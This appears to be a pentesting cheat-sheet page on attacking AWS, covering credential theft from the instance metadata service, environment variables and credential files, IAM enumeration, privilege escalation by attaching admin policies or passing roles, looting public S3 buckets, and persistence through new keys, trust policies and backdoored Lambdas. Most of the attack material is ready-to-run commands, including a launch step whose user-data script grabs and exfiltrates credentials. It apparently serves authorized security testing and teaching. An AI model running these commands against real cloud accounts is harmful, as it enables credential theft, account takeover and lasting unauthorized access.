---
tags:
  - Cloud
---

# :fontawesome-brands-aws: AWS

<span class="pill pill-hard">cloud</span> <span class="pill pill-info">iam</span>

Everything in AWS is **IAM**. Attacks revolve around obtaining credentials, discovering what those credentials can do, and abusing an IAM misconfiguration to escalate.

!!! abstract "TL;DR"
    Get creds (IMDS/env/keys) → `sts get-caller-identity` → enumerate permissions → find a privesc primitive (`iam:PassRole`, `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, …) → become admin → loot & pivot.

## :material-key: Getting credentials

=== "IMDS (from a shell/SSRF on EC2)"

    ```bash
    # IMDSv1
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

    # IMDSv2 (token required)
    TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" \
      -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
    curl -H "X-aws-ec2-metadata-token: $TOKEN" \
      http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
    ```
    See [SSRF](../web/ssrf.md) for reaching IMDS through a web bug.

=== "Environment & files"

    ```bash
    env | grep -i aws
    cat ~/.aws/credentials ~/.aws/config
    # ECS containers:
    curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
    # Lambda:
    env | grep AWS_SESSION_TOKEN
    ```

=== "Set them up"

    ```bash
    export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
    aws sts get-caller-identity        # who am I?
    ```

!!! loot "Temporary creds = full API access"
    An `AccessKeyId` + `SecretAccessKey` + `Token` from IMDS gives you the instance role's permissions from *your own* machine. This is the single highest-value item in AWS pentesting.

## :material-format-list-bulleted: Enumeration

```bash
# Non-destructive identity & permission mapping
aws sts get-caller-identity
aws iam get-account-authorization-details      # if allowed — the whole IAM map
enumerate-iam --access-key ... --secret-key ...  # brute the allowed actions

# Automated posture / privesc discovery
pacu                                # interactive AWS exploitation framework
scout suite aws                     # config audit
cloudfox aws --profile x inventory  # attacker-focused enumeration
```

Then look at what you can reach:

```bash
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
aws ssm describe-parameters
```

## :material-arrow-up-bold-hexagon-outline: IAM privilege escalation

<span class="pill pill-hard">the main event</span>

There are ~20 known primitives (Rhino Security's classic list). The most common:

| Permission you have | Escalation |
| --- | --- |
| `iam:CreatePolicyVersion` | Set a new *default* version granting `*:*` |
| `iam:AttachUserPolicy` | Attach `AdministratorAccess` to yourself |
| `iam:PutUserPolicy` | Inline an admin policy on yourself |
| `iam:AddUserToGroup` | Join an admin group |
| `iam:CreateAccessKey` | Mint keys for a more-privileged user |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with an admin role, read its creds |
| `iam:PassRole` + `lambda:CreateFunction` | Run code as an admin role |
| `sts:AssumeRole` (misconfigured trust) | Assume a more-privileged role |

Example — attach admin to yourself:

```bash
aws iam attach-user-policy --user-name me \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Example — PassRole via EC2:

```bash
aws ec2 run-instances --image-id ami-xxxx --instance-type t2.micro \
  --iam-instance-profile Name=admin-profile \
  --user-data file://grab-and-exfil-creds.sh
```

!!! tip "Let Pacu find the path"
    ```bash
    pacu > run iam__enum_permissions
    pacu > run iam__privesc_scan     # tells you which primitive you can use
    ```

## :material-bucket: S3 misconfigurations

```bash
# Public / misconfigured buckets
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/secret.txt . --no-sign-request
aws s3 sync s3://bucket-name ./loot --no-sign-request

# Enumerate bucket names
# https://bucket.s3.amazonaws.com  -> 200/403/NoSuchBucket tells you a lot
```

!!! loot "What to grab"
    Config files, `.env`, terraform state (`*.tfstate` — often full of secrets!), backups, and CI artifacts. Terraform state frequently contains plaintext credentials.

## :material-anchor: Persistence & pivot

- Create a **new IAM user + access key** (survives instance reboots).
- Add a trust policy so you can `AssumeRole` from an external account.
- Backdoor a Lambda with an environment-var exfil.
- `sts get-federation-token` / `sts assume-role` to hop between accounts.

!!! opsec "CloudTrail sees everything"
    Every API call is logged. `iam:*`, `CreateAccessKey`, and `ec2:RunInstances` are high-signal. On a real engagement, coordinate timing and expect detection.

## :material-link-variant: Related

- Arrived here via [SSRF](../web/ssrf.md)? That's the classic entry.
- Compare the model with [Azure](azure.md) and [GCP](gcp.md).
- Reference: [HackTricks Cloud – AWS](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/index.html).
